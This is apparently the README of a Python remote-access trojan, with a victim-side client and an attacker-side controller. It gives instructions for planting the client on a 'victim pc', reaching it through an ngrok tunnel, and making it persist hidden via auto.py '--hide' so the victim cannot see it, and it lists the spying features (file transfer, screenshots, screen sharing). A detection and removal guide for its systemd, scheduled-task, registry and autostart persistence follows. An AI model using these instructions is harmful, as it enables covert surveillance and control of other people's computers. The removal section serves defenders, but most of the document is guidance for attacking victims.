## Malwares

**Attacker should change its ip address in client.py before put it in victim pc**

**You can use ngrok TCP tunnel or other public TCP tunnel if victim is outside local network**

**Tested on: Windows, Arch linux , Kali linux , Fedora , Linux mint**

**Some features didn't work on Fedora, you may face some issues like screenshare or screenshot not working and if you press ctrl+c, you may loose access untill next loging or reboot in fedora**

**In Linux mint , it's not working after reboot**

**Just replace TCP tunnel address with current ip address**

**Client.py is the malware that Attacker will put in victim pc. and Controller.py is controller for Attacker**

---

# Features:

**You need to learn victim os command prompt to operate**

**download , upload , screenshot , screenshare**

**screenshare will open video on default web browser**

---

# **For one session only:**

**In victim pc, run:**

```bash
python Client.py
```

**In Attacker pc, run:**

```bash
python Controller.py
```

# **For Permanent hack:**

**You need to download auto.py. To know what auto.py is and to get latest update check:**

https://github.com/boss-defender/Auto-Py.git

# Foreground session:

**In victim pc, run:**

**If victim os is Linux based :**

```bash
python auto.py Client.py
```
**If victim os is Windows 10/11 :**

**Then run cmd.exe in administrative mode and go to the directory where you save auto.py and Client.py and then run this:**

```bash
python auto.py Client.py
```

**In Attacker pc, run:**

```bash
python Controller.py
```

**Problem for Foreground session is: Victim can see what's going on in his pc and can stop it easily**

# Background session:

**In victim pc, run:**

**If victim os is Linux based :**

```bash
python auto.py Client.py --hide
```
**If victim os is Windows 10/11 :**

**Then run cmd.exe in administrative mode and go to the directory where you save auto.py and Client.py and then run this:**

```bash
python auto.py Client.py --hide
```

**In Attacker pc, run:**

```bash
python Controller.py
```

**Advantages for Background session is: Victim can not see what's going on in his pc and need manual configuration to remove.**


---

## Dependency Problem:

**Both Attacker and Victim pc require Python 3.7 or newer (Python’s standard library for networking and their main control flow.)**

**Check it out here:**

https://python-academy.org/en/guide/python-installation

**For victim pc :**

**In Windows, other necessary dependencies might be already there**

**But if victim pc is Linux, Check first everythings work or not**

**Specially this command**

```bash
screenshare 
```

**If it works , then nothing to do**

**But if it causes errors, then follow this**

**Required third-party package: Pillow (PIL) is used for screenshots and screen sharing. The client attempts to install it automatically at startup; if that fails, the main loop continues, but capture features may fail.**

**Run this command on Victim Linux pc:**

**For Debian based or Ubuntu :**
```bash
sudo apt update && sudo apt install -y libglib2.0-bin grim python3-pil python3-pyautogui spectacle
```
**For Red Hat based or Fedora :**
```bash
sudo dnf check-update; sudo dnf makecache && sudo dnf install -y glib2 grim python3-pillow python3-pyautogui spectacle --skip-unavailable
```
**For Arch based:**
```bash
sudo pacman -Syu --noconfirm glib2 grim python-pillow spectacle && yay -S --noconfirm python-pyautogui
```

Optional capture tools, depending on the desktop:

- Wayland on Hyprland/Sway: grim

- KDE: spectacle

- GNOME: gdbus and GNOME Shell’s screenshot interface

- X11: ImageMagick’s import command

- pyautogui is an optional fallback

The code reports gnome-screenshot as an available helper, but its capture function uses gdbus for GNOME instead.

---

**Now the removal**

# Easiest Removal Guide (Recommended):

## **If Attacker use One session hack only** 

**Then removing the Client.py and system restart is enough.**

## **If Attacker use Permanent hack** 

**Then go to ~/Visible-Background-Process. This folder should be in your user home directory.**

**For Windows:**

```bash
C:\Users\<user-name>\Visible-Background-Process
```
**For Linux:**

```bash
/home/<user-name>/Visible-Background-Process
```
**Then check for two files: 1) auto.py  &  2) Client.py**

**If you don't find auto.py then download it from here :**

https://github.com/boss-defender/Auto-Py.git

**Then put auto.py in Visible-Background-Process folder only if auto.py was not there**

**Then run:**

```bash
python auto.py Client.py --stop
```

**This is enough . Malware is removed**

**Again to know more about auto.py and its feature go this link and read README.md file.**
https://github.com/boss-defender/Auto-Py.git

**Now for Hard process and professional analysist:**


---


# Detection & Removal Guide (Not Recommended):

How to detect and **permanently remove** the persistence (auto-start) artifacts
this tool can leave on a machine — on Linux (systemd) and Windows. Written so it
can be published alongside the tool, or used to clean up lab VMs. It also lists
the places to check for this general class of tool, which is useful for
analysts.

> Closing the running program is **not** enough: an auto-start entry can still
> bring it back after a reboot. The steps below remove the entry itself.

---

## Quick removal (when the client is still running)

- From the controller: type `unpersist`
- On the machine itself: `python3 client.py --remove-persist`
- Self-copying builds (see the `Visible-Background-Process` section below):
  on the machine, e.g. `python auto.py client.py --stop` removes the auto-start
  entry and stops the processes — check for leftover copied files anyway

All of these remove the auto-start entry. A copy that is **already running**
stays up until it is closed or the machine is rebooted. If the script file
itself was deleted, moved, or renamed, use the manual steps below.

---

## Linux (systemd)

### What to look for

| Artifact | Where |
|---|---|
| User service | `~/.config/systemd/user/autorun-client.service` |
| System service (installed with sudo) | `/etc/systemd/system/autorun-client.service` |

```bash
# list and inspect
systemctl --user list-unit-files 'autorun-*'
systemctl --user status autorun-client.service
systemctl status autorun-client.service        # system-level
```

The `ExecStart=` line points at a Python interpreter running `client.py` with
an IP and port, for example:

```
ExecStart=/usr/bin/python3 /path/to/client.py 192.0.2.10 4444
```

### Remove — user service

```bash
systemctl --user stop autorun-client.service      # fine if it says "not found"
systemctl --user disable autorun-client.service   # removes autostart links
rm -f ~/.config/systemd/user/autorun-client.service
systemctl --user daemon-reload
systemctl --user reset-failed                     # clears a red "failed" state
```

### Remove — system service

```bash
sudo systemctl stop autorun-client.service
sudo systemctl disable autorun-client.service
sudo rm -f /etc/systemd/system/autorun-client.service
sudo systemctl daemon-reload
sudo systemctl reset-failed
```

### Stop a running copy

```bash
pgrep -af "client.py"     # note the PIDs
kill <PID>                # add sudo if it was started as root / by a service
```

---

## Windows

### What to look for

| Artifact | Where |
|---|---|
| Scheduled task | `AutoRun_client` (hidden, trigger: at logon) |
| Registry Run value | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` → `AutoRun_client` |
| Startup-approved flag | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run` → `AutoRun_client` |
| Launcher script | `%LOCALAPPDATA%\AutoRunner\AutoRun_client.vbs` |
| Process | `pythonw.exe` running `client.py` |

### Remove (cmd.exe)

```bat
schtasks /Query /TN AutoRun_client /V /FO LIST
schtasks /Delete /TN AutoRun_client /F

reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun_client
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun_client /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v AutoRun_client /f

del "%LOCALAPPDATA%\AutoRunner\AutoRun_client.vbs"
rmdir "%LOCALAPPDATA%\AutoRunner" 2>nul
```

### Stop a running copy (PowerShell)

```powershell
Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" |
  Where-Object { $_.CommandLine -match 'client\.py' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

---

## Self-copying variant (`Visible-Background-Process`)

Newer builds copy the target into a per-user folder and register auto-start for
**the copy**, so the original script file becomes irrelevant. Names below
follow the target: running `python auto.py client.py` uses the name `client`.

| Platform | Artifact |
|---|---|
| Both | Copy folder: `~/Visible-Background-Process/` (`%USERPROFILE%\Visible-Background-Process` on Windows) |
| Linux | XDG autostart entry: `~/.config/autostart/<name>.desktop` — its `Exec=` line points **into the copy folder** |
| Windows | Scheduled task `VisibleBackground_<name>`, whose action runs `VisibleBackground_<name>.vbs` from inside the copy folder |

Two things make this variant different to remove:

- Deleting, quarantining, or renaming the original script does not disable
  anything — the folder copy and its auto-start entry remain.
- Killing the process only stops it until the next logon/reboot. Disable the
  auto-start **first**, then kill, then delete the copy.

### Linux — remove

```bash
# 1. Locate the auto-start entry (its Exec= path points into the copy folder)
grep -R "Visible-Background-Process" ~/.config/autostart/ 2>/dev/null
rm -f ~/.config/autostart/client.desktop      # the file that appeared above
# if the tool ran as other users: check /home/*/.config/autostart/ too

# 2. List and stop whatever runs from the folder
pgrep -af "Visible-Background-Process"
pkill -f "Visible-Background-Process"

# 3. Delete the copy
rm -rf "$HOME/Visible-Background-Process"
```

### Windows — remove (cmd.exe)

```bat
schtasks /Query  /TN VisibleBackground_client /V /FO LIST
schtasks /Delete /TN VisibleBackground_client /F
```

If the task name has a different suffix,
`schtasks /Query /V /FO LIST | findstr /i visible` finds it.

Stop the process, then delete the folder (PowerShell):

```powershell
Get-CimInstance Win32_Process |
  Where-Object { $_.CommandLine -match 'Visible-Background-Process' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
```

```bat
rmdir /s /q "%USERPROFILE%\Visible-Background-Process"
```

Also skim the Run keys and both Startup folders from the Windows section above —
a second reference is easy to miss.

---

## Verifying it is gone

1. Reboot the machine.
2. Check:
   - Linux: `pgrep -af client.py` → no output; `systemctl --user status autorun-client.service` → "not found"
   - Windows: `schtasks /Query /TN AutoRun_client` → "cannot find"; no `pythonw.exe` with `client.py` in Task Manager (Details tab, add the Command line column)
   - Self-copying builds: `~/.config/autostart/` has no entry pointing into `Visible-Background-Process`, and the copy folder is gone (`ls ~/Visible-Background-Process` on Linux, `dir "%USERPROFILE%\Visible-Background-Process"` on Windows returns "not found")
3. With the controller running, no incoming connection should appear after the reboot.

---

## General checklist (this class of tool)

**Linux**
- `~/.config/systemd/user/*.service` — `ExecStart` running python + a script
- `/etc/systemd/system/*.service` — same pattern, often with `User=` set
- XDG autostart: `~/.config/autostart/*.desktop`
- cron: `crontab -l`, `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly}/`
- shell startup files: `~/.bashrc`, `~/.profile`, `~/.zshrc`
- stray script copies: look in `Downloads`, `/tmp`, and dot-directories

**Windows**
- Task Scheduler: tasks with **Hidden** set and an **At log on** trigger whose
  action is `python`/`pythonw` + a `.py` or `.vbs` file
- `Run` / `RunOnce` keys under both `HKCU` and `HKLM`
- Startup folders: `shell:startup` and `shell:common startup`
- Services (`sc query state= all`) with a python-like `ImagePath`
- WMI event subscriptions (advanced persistence, not used here)

**Network**
- Linux: `ss -tnp` | Windows: `netstat -ano`
- Look for an ESTABLISHED outbound connection to the controller's IP:port,
  owned by `python` / `pythonw`

---

## Notes

- Older builds run the original script in place and register exactly **one**
  auto-start entry per platform (systemd unit, Scheduled Task, or XDG
  `.desktop`). The self-copying variant described above runs a copy from
  `~/Visible-Background-Process/` instead — check that folder and its
  auto-start entry as well.
- Removal does not require the controller to be online.

